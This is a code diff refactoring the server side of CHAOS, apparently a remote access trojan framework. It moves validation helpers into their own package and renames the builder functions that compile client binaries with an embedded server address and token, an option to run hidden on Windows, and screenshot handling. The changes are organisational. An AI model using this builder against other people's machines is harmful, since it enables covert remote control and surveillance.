@@ -15,14 +15,12 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
 	"github.com/tiagorlampert/CHAOS/internal/utils/random"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
+	"github.com/tiagorlampert/CHAOS/internal/utils/validation"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
-	"net"
-	"net/url"
 	"os"
 	"os/exec"
-	"regexp"
 	"strings"
 	"sync"
 )
@@ -40,7 +38,7 @@ type clientService struct {
 	AppVersion    string
 	Clients       map[string]*websocket.Conn
 	Mu            *sync.Mutex
-	configuration *environment.Configuration
+	Configuration *environment.Configuration
 	Repository    authRepo.Repository
 	AuthService   auth.Service
 }
@@ -53,7 +51,7 @@ func NewClientService(
 ) Service {
 	return &clientService{
 		AppVersion:    appVersion,
-		configuration: configuration,
+		Configuration: configuration,
 		Clients:       make(map[string]*websocket.Conn, 0),
 		Mu:            &sync.Mutex{},
 		Repository:    repository,
@@ -132,8 +130,9 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 }
 
 func handleResponse(payload *entities.Command) (*entities.Command, error) {
+	const screenshotCmd = "screenshot"
 	switch payload.Command {
-	case "screenshot":
+	case screenshotCmd:
 		filepath, err := image.WritePNG(payload.Response)
 		if err != nil {
 			return nil, err
@@ -147,10 +146,10 @@ func handleResponse(payload *entities.Command) (*entities.Command, error) {
 }
 
 func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
-	if !isValidIPAddress(input.GetServerAddress()) && !isValidURL(input.GetServerAddress()) {
+	if !validation.IsValidIPAddress(input.GetServerAddress()) && !validation.IsValidURL(input.GetServerAddress()) {
 		return "", internal.ErrInvalidServerAddress
 	}
-	if !isValidPort(input.ServerPort) {
+	if !validation.IsValidPort(input.ServerPort) {
 		return "", internal.ErrInvalidServerPort
 	}
 
@@ -161,7 +160,7 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	defer utils.RemoveDir(buildPath)
 
 	filename := buildFilename(input.OSTarget, input.GetFilename())
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, filename)
+	buildCmd := fmt.Sprintf(buildStr, getOSBuildParam(input.OSTarget), getRunHiddenBuildParam(input.RunHidden), c.AppVersion, filename)
 
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = buildPath
@@ -173,12 +172,7 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	return filename, nil
 }
 
-type ClientParam struct {
-	Key   string
-	Value string
-}
-
-func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]ClientParam, error) {
+func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]entities.ClientParam, error) {
 	token, err := c.GenerateNewToken()
 	if err != nil {
 		return nil, err
@@ -189,38 +183,22 @@ func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (m
 	const serverAddressKey = "server_address"
 	const tokenKey = "token"
 
-	configurationMap := make(map[string]ClientParam)
+	configurationMap := make(map[string]entities.ClientParam)
 
-	configurationMap[portKey] = ClientParam{
+	configurationMap[portKey] = entities.ClientParam{
 		Key:   random.GenerateString(stringLength),
 		Value: input.GetServerPort(),
 	}
-	configurationMap[serverAddressKey] = ClientParam{
+	configurationMap[serverAddressKey] = entities.ClientParam{
 		Key:   random.GenerateString(stringLength),
 		Value: input.GetServerAddress(),
 	}
-	configurationMap[tokenKey] = ClientParam{
+	configurationMap[tokenKey] = entities.ClientParam{
 		Key:   random.GenerateString(stringLength),
 		Value: token,
 	}
 
 	return configurationMap, err
-}
-
-func isValidIPAddress(s string) bool {
-	return net.ParseIP(s) != nil
-}
-
-func isValidURL(s string) bool {
-	if _, err := url.ParseRequestURI(s); err != nil {
-		return false
-	}
-	return true
-}
-
-func isValidPort(port string) bool {
-	match, err := regexp.MatchString("^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", port)
-	return match && err == nil
 }
 
 func (c clientService) GenerateNewToken() (string, error) {
@@ -231,7 +209,7 @@ func (c clientService) GenerateNewToken() (string, error) {
 	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
 }
 
-func (c clientService) WriteClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
+func (c clientService) WriteClientConfigurationFile(configuration map[string]entities.ClientParam, buildPath string, sessionFilename string) error {
 	m := make(map[string]string)
 	for _, config := range configuration {
 		m[config.Key] = config.Value
@@ -247,7 +225,7 @@ func (c clientService) WriteClientConfigurationFile(configuration map[string]Cli
 	return utils.WriteFile(buildPath+sessionFilename, bytes.NewBufferString(encoded).Bytes())
 }
 
-func (c clientService) ReplaceClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
+func (c clientService) ReplaceClientConfigurationFile(configuration map[string]entities.ClientParam, buildPath string, sessionFilename string) error {
 	filepath := buildPath + clientConfigFilepath
 	f, err := os.ReadFile(filepath)
 	if err != nil {
@@ -308,18 +286,23 @@ func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string
 	return buildPath, nil
 }
 
-func handleOSType(osType system.OSType) string {
+func getOSBuildParam(osType system.OSType) string {
+	const (
+		windowsKey = "windows"
+		linuxKey   = "linux"
+		unknownKey = "unknown"
+	)
 	switch osType {
 	case system.Windows:
-		return "windows"
+		return windowsKey
 	case system.Linux:
-		return "linux"
+		return linuxKey
 	default:
-		return "unknown"
+		return unknownKey
 	}
 }
 
-func runHidden(hidden bool) string {
+func getRunHiddenBuildParam(hidden bool) string {
 	if hidden {
 		return "-H=windowsgui"
 	}
